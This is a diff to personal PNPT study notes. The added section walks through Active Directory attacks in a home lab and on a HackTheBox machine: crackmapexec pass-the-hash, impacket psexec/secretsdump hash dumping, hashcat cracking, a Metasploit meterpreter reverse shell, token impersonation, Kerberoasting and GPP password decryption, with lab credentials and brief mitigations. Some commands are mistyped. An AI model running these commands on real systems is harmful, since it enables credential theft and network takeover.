@@ -1,5 +1,4 @@
 
-
 ## Before We Begin
 
 ### PNPT Certification Path Progression
@@ -3068,4 +3067,330 @@ fcastle::TREE:51934501eb00515e:9ABE5E3F30739166896A5BEEA3D0621F:0101000000000000
 
 ### Pass the Hash / Password Overview
 
+![[Pasted image 20230323084646.png]]
 
+![[Pasted image 20230323084836.png]]
+
+![[Pasted image 20230323084943.png]]
+
+![[Pasted image 20230323085018.png]]
+
+
+### Installing crackmapexec
+
+> [!todo] 
+>  `sudo apt-get install crackmapexec`
+>  `crackmapexec --help`
+
+![[Pasted image 20230323085451.png]]
+
+### Pass the Password Attacks
+
+> [!todo] 
+> `crackmapexec smb 192.168.203.0/24 -u fcastle -d MARVEL.local -p Password1` 
+
+![[Pasted image 20230323085910.png]]
+
+> [!todo] 
+> Dump SAM file:
+> `rackmapexec smb 192.168.203.0/24 -u fcastle -d MARVEL.local -p Password1` 
+
+![[Pasted image 20230323090210.png]]
+
+> [!todo] 
+> Get Shell on Windows VM:
+> `mpacket-psexec marvel/fcastle:Password1@192.168.203.137` 
+
+![[Pasted image 20230323090640.png]]
+
+### Dumping Hashes with secretsdump.py
+
+> [!todo] 
+>  `impacket-secretsdump marvel/fcastle:Password1@192.168.203.137`
+
+![[Pasted image 20230323091207.png]]
+
+> [!info] 
+> If you dump it from different machines, you can check if hashes are same (password reuse)
+> 
+
+![[Pasted image 20230323091417.png]]
+
+### Cracking NTLM Hashes with Hashcat
+
+> [!attention] 
+> NTLM can be passed around, NTLM 2 hashes can't 
+> 
+
+> [!todo] 
+> On Host OS, not VM, otherwise it's slow:
+> `hashcat.exe -m 1000 hashes.txt rockyou.txt -O` 
+
+![[Pasted image 20230323092239.png]]
+
+### Pass the Hash Attacks
+
+> [!todo] 
+> `crackmapexec smb 192.168.203.0/24 -u "Frank Castle" -H 64f12cddaa88057e06a81b54e73b949b --local-auth` 
+
+![[Pasted image 20230323101025.png]]
+
+> [!todo] 
+>  Try to authentificate with hash:
+>  `impacket-psexec "frank castle":@192.168.203.137 -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b`
+
+![[Pasted image 20230323101621.png]]
+
+### Pass Attack Mitigations
+
+![[Pasted image 20230323101737.png]]
+
+### Token Impersonation Overview
+
+![[Pasted image 20230323102101.png]]
+
+![[Pasted image 20230323102242.png]]
+
+![[Pasted image 20230323102329.png]]
+
+![[Pasted image 20230323102419.png]]
+
+![[Pasted image 20230323102442.png]]
+
+![[Pasted image 20230323102506.png]]
+
+![[Pasted image 20230323102539.png]]
+
+![[Pasted image 20230323102610.png]]
+
+![[Pasted image 20230323102637.png]]
+
+### Token Impersonation with Incognito
+
+> [!todo] 
+> Start Metasploit:
+> `msfconsole`
+> `use exploit/windows/smb/psexec`
+> `options`
+> `set rhosts 192.168.203.137`
+> `set smbdomain marvel.local`
+> `set smbpass Password1`
+> `set smbuser fcastle`
+
+![[Pasted image 20230323104049.png]]
+
+> [!todo] 
+> `show targets`
+> `set target 2`
+> 
+
+![[Pasted image 20230323104155.png]]
+
+> [!todo] 
+> `set payload windows/x64/meterpreter/reverse_tcp` 
+> `set lhost eth0`
+
+![[Pasted image 20230323104433.png]]
+
+> [!todo] 
+> `run` 
+
+![[Pasted image 20230323104546.png]]
+
+> [!todo] 
+> Now we have a meterpreter shell. Now we can run all fun stuff:
+> `hashdump`
+> `getuid`
+> `sysinfo`
+
+![[Pasted image 20230323104725.png]]
+
+![[Pasted image 20230323104856.png]]
+
+> [!todo] 
+> `load incognito` 
+> `help`
+
+![[Pasted image 20230323105033.png]]
+
+> [!todo] 
+> `list_tokens -u`
+
+![[Pasted image 20230323105502.png]]
+
+> [!todo] 
+> `impersonate_token marvel\\administrator` 
+> `shell`
+> `whoami`
+
+![[Pasted image 20230323165805.png]]
+
+![[Pasted image 20230323165847.png]]
+
+> [!todo] 
+> `Ctrl C` to leave Windows shell
+> `rev2shell` to go back as user we got in to machine
+> How we can use again for example `hashdump`
+
+![[Pasted image 20230323170146.png]]
+
+> [!todo] 
+> Login to our Windows 10 VM as `fcastle` 
+
+![[Pasted image 20230323170307.png]]
+
+> [!info] 
+> Now we can see that `fcastle` user is logged in:
+> `list_tokens -u`
+
+![[Pasted image 20230323170450.png]]
+
+> [!hint] 
+> This token is valid until reboot 
+
+> [!todo] 
+>  `impersonate_token marvel\\fcastle`
+>  `shell`
+>  `whoami`
+
+![[Pasted image 20230323170752.png]]
+
+### Token Impersonation Mitigation
+
+![[Pasted image 20230323170913.png]]
+
+> [!important] 
+>  - Domain Administrator should only login to machines which are Domain Controllers
+>  - If Domain Administrator login to Computer or Server and this Machine got compromised, the maybe can impersonate his token
+>  - Administrator (for example `bob-admin`) should have additional account for daily use (`bob`) without Domain Admin privilage.
+
+### Kerberoasting Overview
+
+![[Pasted image 20230323171606.png]]
+
+![[Pasted image 20230323173026.png]]
+
+![[Pasted image 20230323173120.png]]
+
+### Kerberoasting Walkthrough
+
+> [!todo] 
+>  `impacket-GetUserSPNs marvel.local/fcastle:Password1 -dc-ip 192.168.203.136 -request`
+
+![[Pasted image 20230323173533.png]]
+
+> [!info] 
+> Now try to crack hash:
+> `hashcat --help | grep Kerberos`
+
+![[Pasted image 20230323173856.png]]
+
+> [!todo] 
+> Crack hash:
+> `hashcat.exe -m 13100 hashes.txt rockyou.txt -O` 
+
+![[Pasted image 20230323174125.png]]
+
+> [!hint] 
+> Now we cracked Password of 14 characters which has Domain Admin access
+> **Don't use weak passwords!**
+
+### Kerberoasting Mitigation
+
+![[Pasted image 20230323174426.png]]
+
+> [!tip] 
+> - Use strong password for service accounts (30 characters or more)
+> - Don't make your users Domain Administrator
+> - Don't make your service accounts Domain Administrator
+
+
+### GPP / cPassword Attacks Overview
+
+> [!note] 
+>  Resources for this video:
+>  Group Policy Pwnage: [https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/](https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/)
+>  - Group Policy Preferences (GPP): These policies allowed administrators to set local accounts, embed credentials for the purposes of mapping drives, or perform other tasks that may otherwise require an embedded password in a script.
+>  - Storage mechanism for the credentials was flawed and allowed attackers to trivially decrypt the plaintext credentials.
+>  - While addressed in MS14-025, this patch only prevents new policies from being created, and any legacy GPPs containing credentials must be found and removed.
+
+![[Pasted image 20230325122423.png]]
+
+> [!tip] 
+> There is module in Metasploit to scan for it:
+> `smb_enum_gpp`
+> 
+
+
+### Abusing GPP: Part 1
+
+> [!info] 
+> Start VM on HackTheBox (VIP Account needed for this Machine):
+> https://app.hackthebox.com/machines/Active
+> 
+
+> [!todo] 
+> Start VM, connect  via VPN:
+> `sudo openvpn your-profile.ovpn`
+
+
+> [!todo] 
+> nmap Scan:
+> `nmap -T5 10.10.10.100`
+> 
+
+![[Pasted image 20230329152622.png]]
+
+> [!todo] 
+> Check Anonymous Loging via SMB:
+>  `smbclient -L \\\\10.10.10.100\\`
+
+![[Pasted image 20230329152803.png]]
+
+> [!todo] 
+> We have access to `Replication` share as anonymous:
+>  `smbclient \\\\10.10.10.100\\Replication`
+
+![[Pasted image 20230329153002.png]]
+
+> [!todo] 
+> Run in `smb` shell:
+> `prompt off` 
+> `recurse on`
+> `ls`
+
+![[Pasted image 20230329153447.png]]
+
+![[Pasted image 20230329153611.png]]
+
+> [!info] 
+> `Groups.xml` is file we're intressted in
+> 
+
+> [!todo] 
+> `mget *` 
+
+![[Pasted image 20230329153741.png]]
+
+![[Pasted image 20230329153932.png]]
+
+![[Pasted image 20230329154105.png]]
+
+
+> [!todo] 
+> Run in Kali Terminal:
+> `gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ` 
+
+![[Pasted image 20230329154240.png]]
+
+> [!done] 
+> Now we have username and password:
+> Username: `active.htb\SVC_TGS`
+> Password: `GPPstillStandingStrong2k18`
+
+
+### Abusing GPP: Part 2
+
+> [!note] 
+> Try to login and try to escalate privilage by myself:
+>  
